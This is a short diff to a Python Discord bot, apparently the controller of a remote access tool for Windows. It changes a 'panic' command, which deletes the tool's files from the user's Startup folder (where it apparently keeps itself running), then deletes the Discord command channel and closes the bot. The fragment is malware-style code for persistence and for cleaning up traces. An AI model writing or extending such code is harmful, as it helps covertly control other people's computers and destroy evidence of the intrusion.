@@ -108,9 +108,9 @@ async def stop_access(ctx):
 @commands.cooldown(1, 5, commands.BucketType.category)
 async def panic(ctx):
     global stop
-    await ctx.send("Panic mode activated! Stopping access...")
+    await ctx.send("Panic mode activated /!\ Stopping access...")
     
-    await ctx.send("The system will close, and the files will be deleted in the background after 10 seconds.")
+    await ctx.send("The system will close, and the files will be deleted.")
 
     startup_directory = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
     files_to_delete = [
@@ -127,9 +127,10 @@ async def panic(ctx):
         except Exception as e:
             await ctx.send(f"Could not delete `{file}`: {str(e)}")
 
-    await ctx.send("System closed.")
-    await client.close()
+    await ctx.send("Deleting the channel...")
+    await ctx.channel.delete()
     stop = True
+    await client.close()
 
 
 @client.command()
